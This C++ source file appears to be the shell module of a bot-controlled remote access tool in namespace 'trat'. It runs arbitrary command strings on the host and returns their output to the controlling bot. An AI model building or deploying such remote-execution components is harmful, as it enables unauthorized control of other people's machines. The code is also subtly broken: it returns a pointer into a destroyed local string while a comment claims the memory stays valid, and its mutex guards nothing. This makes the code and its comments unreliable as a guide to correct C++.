#include "../../include/shell.hpp"
#include <boost/process.hpp>
#include <sstream>
#include <filesystem>
#include <cstdlib>

namespace trat {

    // Constructor
    Shell::Shell(trat::Bot* MasterBot) : masterBot(MasterBot) {}

    // Get current working directory
    const char* Shell::getCurrentPath() {
        static std::string path = std::filesystem::current_path().string();
        return path.c_str();
    }

    // Execute a shell command without capturing response
    bool Shell::executeShellCommandWithoutResponse(const char* Command) {
        return std::system(Command) == 0;
    }

    // Execute a shell command and capture its response
    ShellResponse Shell::executeShellCommand(const char* Command) {
        ShellResponse shell_response;
        shell_response.isSuccessful = true;
        std::string result; // Ensure the memory is valid across calls
        std::mutex result_mutex; // Mutex to guard access to the result

        std::unique_lock<std::mutex> lock(result_mutex); // Lock during updates
        result.clear(); // Clear any previous result
        try {
            boost::process::ipstream pipe_stream;
            boost::process::child process(Command, boost::process::std_out > pipe_stream);

            std::ostringstream oss;
            std::string line;

            while (pipe_stream && std::getline(pipe_stream, line)) {
                oss << line << '\n';
            }

            process.wait();

            // Update result
            result = oss.str();

        } catch (const std::exception& e) {
            result = "Error: ";
            result += e.what();
            shell_response.isSuccessful = false;
        }
        shell_response.response = result.c_str();
        return shell_response; // Return the result as a C-style string
    }

} // namespace trat
